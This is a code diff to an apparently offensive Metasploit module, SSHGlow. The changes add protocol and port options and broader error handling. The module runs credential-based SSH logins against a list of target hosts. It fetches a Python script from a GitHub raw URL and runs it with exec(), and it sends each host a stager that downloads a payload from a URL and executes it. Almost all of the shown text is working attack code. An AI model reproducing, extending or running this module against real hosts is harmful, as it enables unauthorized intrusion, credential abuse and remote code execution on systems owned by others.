@@ -54,8 +54,10 @@ class MetasploitModule < Msf::Exploit::Remote
 
         register_options([
             OptString.new('RHOST',[true,"Specific target host or file"]),
+            OptString.new('PROTO',[true,'Target protocol supportd protocols [ssh]', "ssh"]),
             OptString.new('Creds',[true,'File or user1:pass1,user2:pass2 or single']),
-            OptInt.new('DELAY', [true, "Delay interval in seconds", 5])
+            OptInt.new('DELAY', [true, "Delay interval in seconds", 5]),
+            OptInt.new('RPORT', [true, "The target port", 22])
         ],self.class)
 
         register_advanced_options(
@@ -196,7 +198,7 @@ class MetasploitModule < Msf::Exploit::Remote
         return args
     end
     
-    def runSSHGlowExec(hosts,creds,delay,noDuplicate,stager)
+    def runSSHGlowExec(hosts, protoname, port, creds, delay, noDuplicate, stager)
         # python3 path
         py_path = IO.popen("which python3").read.strip
 
@@ -209,12 +211,14 @@ class MetasploitModule < Msf::Exploit::Remote
             py_space = ' ' * 4
             py_code = "'import urllib; import sys; from urllib.request import urlopen\n"
             py_code += "try:\n#{py_space}exec(urlopen(\"https://raw.githubusercontent.com/abdallah-elsharif/sshglow/main/sshglow.py\").read().decode(\"utf-8\"))\n"
-            py_code += "#{py_space}run(\"#{hosts}\",\"#{creds}\",delay=#{delay},no_duplicate=#{noDuplicate},cmd=#{stager})\n"
+            py_code += "#{py_space}run(\"#{hosts}\", get_proto(\"#{protoname}\", #{port}),\"#{creds}\", delay=#{delay}, no_duplicate=#{noDuplicate}, cmd=#{stager})\n"
             py_code += "except KeyboardInterrupt:\n"
             py_code += "#{py_space}sys.exit(1)\n"
             py_code += "except urllib.error.URLError:\n"
-            py_code += "#{py_space}print(\"\033[0;31m[!]\033[0;37m We need internet access to load SSHGlow\")'"
-            
+            py_code += "#{py_space}print(\"\033[0;31m[!]\033[0;37m We need internet access to load SSHGlow\")\n"
+            py_code += "except BaseException as e:\n"
+            py_code += "#{py_space}print(\"\033[0;31m[!]\033[0;37m\", e)'"
+
             puts(IO.popen("#{py_path} -c #{py_code}").read() + "\n")
             print_status("SSHGlow Finished !!")
         end
@@ -222,9 +226,11 @@ class MetasploitModule < Msf::Exploit::Remote
 
     def primer()
         hosts = datastore['RHOST']
+        proto = datastore['PROTO']
         creds = datastore['Creds']
         delay = datastore['Delay'].to_s
-        noDuplicate = datastore['noDuplicate'] ? 'True' : 'False'
+        rport = datastore['RPORT'].to_s
+        nodup = datastore['noDuplicate'] ? 'True' : 'False'
 
         # if targets in file
         hosts = handle_file_args(hosts) if File.file?(hosts)
@@ -245,6 +251,6 @@ class MetasploitModule < Msf::Exploit::Remote
 
         stager = "urlopen(\"#{url}\").read().decode(\"utf-8\")"
 
-        runSSHGlowExec(hosts,creds,delay,noDuplicate,stager)
+        runSSHGlowExec(hosts, proto, rport, creds, delay, nodup, stager)
     end
 end
